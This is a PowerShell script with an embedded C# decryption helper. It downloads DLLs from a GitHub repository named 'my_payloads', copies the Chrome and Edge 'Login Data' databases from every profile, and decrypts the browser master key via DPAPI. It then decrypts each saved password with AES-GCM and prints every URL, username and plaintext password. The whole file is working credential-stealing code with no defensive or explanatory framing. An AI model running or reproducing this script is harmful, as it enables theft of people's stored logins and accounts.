# Define browser login database paths
$ChromePath = "$env:LOCALAPPDATA\Google\Chrome\User Data"
$EdgePath = "$env:LOCALAPPDATA\Microsoft\Edge\User Data"

# SQLite DLL Paths
$SQLiteDllPath = "$env:TEMP\System.Data.SQLite.dll"
$SQLiteInteropPath = "$env:TEMP\SQLite.Interop.dll"
$SystemSecurityDllPath = "$env:TEMP\System.Security.dll"
$AlgorithmsDllPath = "$env:TEMP\System.Security.Cryptography.Algorithms.dll"

# Download SQLite DLLs if missing
if (-not (Test-Path $SQLiteDllPath)) {
    Invoke-WebRequest -Uri "https://github.com/Soumyo001/my_payloads/raw/refs/heads/main/assets/System.Data.SQLite.dll" -outfile $SQLiteDllPath
}
if (-not (Test-Path $SQLiteInteropPath)) {
    Invoke-WebRequest -Uri "https://github.com/Soumyo001/my_payloads/raw/refs/heads/main/assets/SQLite.Interop.dll" -outfile $SQLiteInteropPath
}
if (-not (Test-Path $SystemSecurityDllPath)) {
    Invoke-WebRequest -Uri "https://github.com/Soumyo001/my_payloads/raw/refs/heads/main/assets/System.Security.dll" -outfile $SystemSecurityDllPath
}
if (-not (Test-Path $AlgorithmsDllPath)) {
    Invoke-WebRequest -Uri "https://github.com/Soumyo001/my_payloads/raw/refs/heads/main/assets/System.Security.Cryptography.Algorithms.dll" -outfile $AlgorithmsDllPath
}

# Load SQLite Assembly
Add-Type -Path $SQLiteDllPath -ErrorAction Stop
Add-Type -Path $SystemSecurityDllPath -ErrorAction Stop
Add-Type -Path $AlgorithmsDllPath -ErrorAction Stop

Add-Type -TypeDefinition @"
using System;
using System.Security.Cryptography;
using System.Text;

public class CryptoHelper {
    public static byte[] Decrypt(byte[] encryptedData, byte[] aesKey) {
        try {
            if (encryptedData == null || encryptedData.Length < 3)
                throw new Exception("Invalid encrypted data");

            Console.WriteLine(string.Format("Encrypted Data Length: {0}", encryptedData.Length));

            if (encryptedData[0] == 118 && encryptedData[1] == 49 && encryptedData[2] == 48) {
                Console.WriteLine("Using AES-GCM Decryption");
                return DecryptAESGCM(encryptedData, aesKey);
            } else {
                Console.WriteLine("Using DPAPI Decryption");
                return ProtectedData.Unprotect(encryptedData, null, DataProtectionScope.CurrentUser);
            }
        }
        catch (Exception ex) {
            return Encoding.UTF8.GetBytes("[Unable to decrypt] Error: " + ex.Message);
        }
    }

    private static byte[] DecryptAESGCM(byte[] encryptedData, byte[] aesKey) {
        try {
            if (encryptedData.Length < 28)
                throw new Exception("Invalid AES-GCM encrypted data");

            byte[] iv = new byte[12]; // IV is 12 bytes
            byte[] tag = new byte[16]; // Tag is 16 bytes
            byte[] ciphertext = new byte[encryptedData.Length - 28];

            Array.Copy(encryptedData, 3, iv, 0, 12);
            Array.Copy(encryptedData, encryptedData.Length - 16, tag, 0, 16);
            Array.Copy(encryptedData, 15, ciphertext, 0, ciphertext.Length);

            Console.WriteLine(string.Format("IV Length: {0}", iv.Length));
            Console.WriteLine(string.Format("Ciphertext Length: {0}", ciphertext.Length));
            Console.WriteLine(string.Format("Tag Length: {0}", tag.Length));

            using (AesGcm aesGcm = new AesGcm(aesKey)) {
                byte[] decrypted = new byte[ciphertext.Length];
                aesGcm.Decrypt(iv, ciphertext, tag, decrypted);
                return decrypted;
            }
        }
        catch (Exception ex) {
            return Encoding.UTF8.GetBytes("[AES-GCM decryption failed] Error: " + ex.Message);
        }
    }
}
"@ -Language CSharp -ReferencedAssemblies "System.Security"


function Get-AESKey {
    param ($BrowserPath)
    
    $LocalStatePath = "$BrowserPath\Local State"
    
    if (-not (Test-Path $LocalStatePath)) {
        Write-Output "[!] Local State file not found!"
        return $null
    }

    $LocalState = Get-Content -Path $LocalStatePath -Raw | ConvertFrom-Json
    $EncryptedKey = [System.Convert]::FromBase64String($LocalState.os_crypt.encrypted_key)
    
    # Remove 'DPAPI' prefix (first 5 bytes)
    $EncryptedKey = $EncryptedKey[5..($EncryptedKey.Length - 1)]
    
    # Decrypt using DPAPI
    return [System.Security.Cryptography.ProtectedData]::Unprotect($EncryptedKey, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
}

# Function to extract login data from all profiles
function Extract-Passwords {
    param (
        [string]$BrowserPath,
        [string]$BrowserName
    )

    # Check if the browser data exists
    if (-not (Test-Path $BrowserPath)) {
        Write-Output "$BrowserName not found."
        return
    }

    # Get all profiles (including "Default" and custom profiles)
    $Profiles = Get-ChildItem -Path $BrowserPath -Directory | Where-Object { $_.Name -match "Default|Profile \d+" }

    foreach ($Profile in $Profiles) {
        $LoginDB = "$($Profile.FullName)\Login Data"
        $TempDB = "$env:TEMP\$BrowserName-$($Profile.Name)-LoginData.db"

        if (Test-Path $LoginDB) {
            Copy-Item -Path $LoginDB -Destination $TempDB -Force

            # SQLite Connection String
            $ConnectionString = "Data Source=$TempDB;Version=3;"
            $Query = "SELECT origin_url, username_value, password_value FROM logins"

            # Open SQLite connection
            $SQLiteConnection = New-Object System.Data.SQLite.SQLiteConnection($ConnectionString)
            $SQLiteConnection.Open()
            $SQLiteCommand = $SQLiteConnection.CreateCommand()
            $SQLiteCommand.CommandText = $Query

            $SQLiteReader = $SQLiteCommand.ExecuteReader()

            while ($SQLiteReader.Read()) {
                $url = $SQLiteReader["origin_url"]
                $username = $SQLiteReader["username_value"]
                $encryptedPassword = $SQLiteReader["password_value"]

                # Decrypt password
                $AESKey = Get-AESKey -BrowserPath $BrowserPath

                try {
                    if ($encryptedPassword -is [System.Byte[]] -and $encryptedPassword.Length -gt 0) {
                        $decryptedPassword = [CryptoHelper]::Decrypt($encryptedPassword, $AESKey)
                        $decryptedPassword = [System.Text.Encoding]::UTF8.GetString($decryptedPassword)
                    } else {
                        $decryptedPassword = "[Invalid password format]"
                    }
                }
                catch {
                    Write-Error "Error decrypting password from ${username}: $_"
                    $decryptedPassword = "[Unable to decrypt]"
                }                

                Write-Output "[$BrowserName - $($Profile.Name)]"
                Write-Output "URL: $url"
                Write-Output "Username: $username"
                Write-Output "Password: $decryptedPassword"
                Write-Output "--------------------------------"
            }

            $SQLiteReader.Close()
            $SQLiteConnection.Close()
        }
    }
}


Extract-Passwords -BrowserPath $ChromePath -BrowserName "Chrome"
Extract-Passwords -BrowserPath $EdgePath -BrowserName "Edge"
